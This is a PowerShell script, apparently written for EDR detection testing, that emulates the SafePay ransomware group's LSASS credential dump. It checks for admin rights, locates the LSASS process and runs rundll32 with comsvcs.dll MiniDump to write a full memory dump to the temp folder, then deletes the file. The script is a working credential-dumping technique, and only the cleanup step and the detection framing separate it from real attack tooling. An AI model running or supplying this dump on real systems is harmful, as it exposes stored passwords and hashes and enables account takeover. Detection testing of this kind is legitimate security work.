<#
.SYNOPSIS
    SafePay LSASS Credential Dump - DETECTION TRIGGER
.DESCRIPTION
    Dumps LSASS memory using comsvcs.dll MiniDump.
    Will trigger EDR detection for T1003.001.
    REQUIRES ADMIN PRIVILEGES.
    TTP: T1003, T1003.001
#>
Write-Host "[*] Starting SafePay Credential Dumping (T1003)" -ForegroundColor Cyan
Write-Host "[*] This will trigger EDR detection for credential access" -ForegroundColor Yellow

try {
    # Check if running as admin
    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    
    if (-not $isAdmin) {
        Write-Host "[!] WARNING: Not running as Administrator - LSASS dump will fail" -ForegroundColor Red
    }
    
    # Get LSASS PID
    $lsass = Get-Process lsass -ErrorAction SilentlyContinue
    
    if ($lsass) {
        Write-Host "[*] LSASS Process ID: $($lsass.Id)" -ForegroundColor Yellow
        
        # Create temp directory for dump
        $dumpPath = "$env:TEMP\lsass_rtl_test.dmp"
        
        Write-Host "[*] Executing: rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $($lsass.Id) $dumpPath full"
        
        # ACTUAL DETECTION TRIGGER - This will attempt to dump LSASS
        # CrowdStrike will likely block this but will generate a detection
        $result = Start-Process -FilePath "rundll32.exe" -ArgumentList "C:\Windows\System32\comsvcs.dll, MiniDump $($lsass.Id) $dumpPath full" -Wait -PassThru -NoNewWindow -ErrorAction SilentlyContinue
        
        if (Test-Path $dumpPath) {
            Write-Host "[+] SUCCESS: LSASS dump created at $dumpPath" -ForegroundColor Green
            Write-Host "[!] Cleaning up dump file for safety..." -ForegroundColor Yellow
            Remove-Item $dumpPath -Force -ErrorAction SilentlyContinue
            Write-Host "[+] Dump file removed" -ForegroundColor Green
        } else {
            Write-Host "[-] Dump file not created - EDR likely blocked but detection should still trigger" -ForegroundColor Yellow
        }
        
        Write-Host "[!] CrowdStrike should detect: 'LsassMemoryAccess' or 'CredentialDumping'" -ForegroundColor Magenta
        
    } else {
        Write-Host "[!] LSASS process not found" -ForegroundColor Red
    }
    
} catch {
    Write-Host "[!] Error: $_" -ForegroundColor Red
    Write-Host "[-] This is expected if EDR blocked the action" -ForegroundColor Yellow
}

Write-Host "`n[*] Detection should appear in CrowdStrike within 1-2 minutes" -ForegroundColor Cyan
